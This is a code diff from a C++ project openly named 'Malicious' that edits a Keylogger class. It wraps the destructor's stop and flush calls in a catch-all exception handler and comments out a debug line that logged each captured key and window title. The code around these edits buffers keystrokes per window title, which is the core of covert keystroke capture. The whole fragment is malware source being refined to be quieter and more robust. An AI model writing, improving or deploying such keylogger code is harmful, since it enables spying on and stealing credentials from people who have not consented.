@@ -135,8 +135,14 @@ namespace Malicious
 	
     Keylogger::~Keylogger()
 	{
-	    stop();
-		flush();
+		try
+		{
+			stop();
+			flush();
+		}
+		catch(...)
+		{
+		}
 	}
 	
 	void Keylogger::clearKeylog()
@@ -233,7 +239,7 @@ namespace Malicious
         updateWindowTitle();
         log_buffer[window] += key;
 		buffered_char++;
-		LOG << "Key : " + toString(key) + " <=> " + window + ", buffer = " + toString(buffered_char);
+		//LOG << "Key : " + toString(key) + " <=> " + window + ", buffer = " + toString(buffered_char);
 		if(buffered_char >= MAX_BUFFERED)
 		{
 			flush();
